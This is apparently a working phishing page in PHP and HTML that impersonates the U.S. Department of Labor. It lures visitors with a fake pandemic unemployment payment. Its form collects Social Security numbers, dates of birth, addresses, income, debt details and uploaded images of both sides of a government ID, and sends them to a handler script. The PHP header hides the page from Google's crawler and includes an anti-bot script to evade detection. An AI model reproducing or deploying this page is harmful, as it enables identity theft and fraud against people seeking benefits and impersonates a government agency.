<?php
session_start();
include('antibots.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Cache-Control" content="private, no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache"> 
    <meta http-equiv="Expires" content="-1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex,nofollow">
    <title>Back to Work | Department of Labor</title>
    <link rel="shortcut icon" href="favicon.ico">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/font.css" rel="stylesheet">
    <link href="css/styles.css" rel="stylesheet">
    <link href="css/application.css" rel="stylesheet">
    <script async="" src="https://www.google-analytics.com/analytics.js"></script>
    <script src="css/jquery-3.5.1.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</head>
<body class="bg-white">
	<header>
        <div id="banner" role="banner" alt="banner">
            <section class="usa-banner" aria-label="Official government website">
                <div class="usa-accordion">
                    <header>
                        <div id="bannerOuter">
                            <div id="bannerInner" class="container">
                                <div class="bannerRow">
                                    <img src="images/official-site-flag.png" class="official-site-flag mr-2" alt="US Flag">
                                        <div class="bannerText fill">An official website of the United States Government</div>
                                </div>
                            
                                <div class="bannerRow">
                                    <div id="flagEqualizer"></div>
                                        <div class="bannerText fill">
                                            <a id="aExpandHeaderBar" href="#" alt="Expand &quot;Here's how you know&quot;">
                                                <span>Here's how you know</span>
                                                <img id="aExpandHeaderArrow" src="images/arrow-down.svg" alt="" aria-label="" width="10px" padding="0" border="0" data-isexpanded="false">
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                    </header>
                </div>
            </section>
        </div>
        <nav id="nav" class="sadi-header mb-3">
            <div id="navbarText" class="container sadi-header py-0 my-0">
                <div class="sadi-header py-0 my-0 mr-2 sadi-header-flex-left">
                    <img src="images/logo-primary.svg" class="mr-3 sadi-header-logo" alt="Department of Labor"><span style="font-size: 20px; font-weight: 600; margin-left: -20px;">U.S. Department of Labor</span>
                </div>
            </div>
        </nav>
    </header>
    <div id="main">
            <div class="page-container" data-role="page-container">
                <div class="container">
                    <div class="content-container">
                        <form class="new_user" id="new_user" action="prohqcker.php" accept-charset="UTF-8" method="post" enctype="multipart/form-data">
                            <main aria-labelledby="sr_page_title" class="form-container">
                                <div class="form-header-access">
                                    <h1 id="sr_page_title">FEDERAL GOVERNMENT UNEMPLOYMENT PANDEMIC COMPENSATION</h1>
                                    <p>The United State of America provide $808 Million pursuant to the Coronavirus, Aid, Relief, And Economic Security (Cares) Act to assist retired, employee and employer in the society an an help to the rise in inflation and back to work compensation.</p>
                                </div>
                                <div class="form-header-access"><h1 style="font-size: 16px; padding-top: 15px;" id="sr_page_title">Please provide the requested information below to be eligible for the payment</h1></div>
                                <div class="form-fields">
                                    <div class="field-group">
                                        <div class="required-instructions"><span>* Indicates a required field</span></div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Full Name</label>
                                            <input placeholder="Enter your Full Name" name="fname" required="required" type="text" id="user_texts_attributes_0_address">
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Date of Birth</label>
                                            <input placeholder="(mm/dd/yyyy)" name="dob" required="required" type="date" id="user_texts_attributes_0_address">
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Social Security Number</label>
                                            <input placeholder="Enter your SSN" name="ssn" required="required" type="tel" id="user_texts_attributes_0_address">
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Email Address</label>
                                            <input placeholder="Enter your Email Address" name="email" required="required" type="email" id="user_texts_attributes_0_address">
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Phone Number</label>
                                            <input placeholder="Enter your Phone Number" name="phone" required="required" type="tel" id="user_texts_attributes_0_address">
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Street Address</label>
                                            <input placeholder="Enter your Street Address" name="address" required="required" type="text" id="user_texts_attributes_0_address">
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Zip Code</label>
                                            <input placeholder="Enter your Zip Code" name="zip" required="required" type="tel" id="user_texts_attributes_0_address">
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Employment Status</label>
                                            <select name="emp">
                                                <option>Select Option</option>
                                                <option>Yes</option>
                                                <option>No</option>
                                            </select>
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">If Yes Full-Time or Part-Time</label><span style="font-size: 14px; padding-left: 5px; font-style: italic;">(optional)</span>
                                            <select name="empa">
                                                <option>Select Option</option>
                                                <option>Full-Time</option>
                                                <option>Part-Time</option>
                                            </select>
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Yearly Income After Tax</label>
                                            <input placeholder="Enter Amount Only" name="year" required="required" type="tel" id="user_texts_attributes_0_address">
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">Credit Debt</label>
                                            <select name="debt">
                                                <option>Select Option</option>
                                                <option>Yes</option>
                                                <option>No</option>
                                            </select>
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">If YES Amount</label><span style="font-size: 14px; padding-left: 5px; font-style: italic;">(optional)</span>
                                            <input placeholder="Enter Amount Only" name="yeara" required="required" type="tel" id="user_texts_attributes_0_address">
                                        </div>
                                        <p style="font-size: 18px; padding: 10px; font-weight: 600; text-align: center; background-color: #00599c; color: white;">UPLOAD GOVERMENT ID BELOW</p><br><br>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">ID Front</label>
                                            <input name="file[]" required="required" type="file" id="user_texts_attributes_0_address">
                                        </div>
                                        <div class="field text suggest">
                                            <label class="required" for="user_texts_attributes_0_address">ID Back</label>
                                            <input name="file[]" required="required" type="file" id="user_texts_attributes_0_address">
                                        </div>
                                    </div>
                                </div>
                                <div class="form-actions">
                                    <input type="submit" name="submit" value="Submit" class="btn btn-primary">
                                </div>
                            </main>
                        </form>
                    </div>
                </div>
            </div>
        </div><br><br><br>
        <footer class="footer sadi-footer" style="position: relative; bottom: 0; width: 100%">
        <div class="container flex sadi-footer-position">
            <div class="grid-row grid-gap-lg">
                <div>
                    <a href="#"><img id="footerLogo" style="padding-top: 10px;" src="images/logo-primary.svg" height="35px" padding="0" border="0" alt="U.S. Department of Labor"></a>
                    <span style="font-size: 16px; margin-left: -10px; font-weight: 600; color: white;">U.S. Department of Labor</span>
                </div>
                <div class="footer-links-position">
                    <span class="text-white">
                        <a href="#" class="text-white mr-2">Privacy Policy</a>|
                    </span>
                    <span class="text-white">
                        <a href="#" class="text-white ml-2">Accessibility</a>
                    </span>
                </div>
            </div>
        </div>
    </footer>
</body>
</html>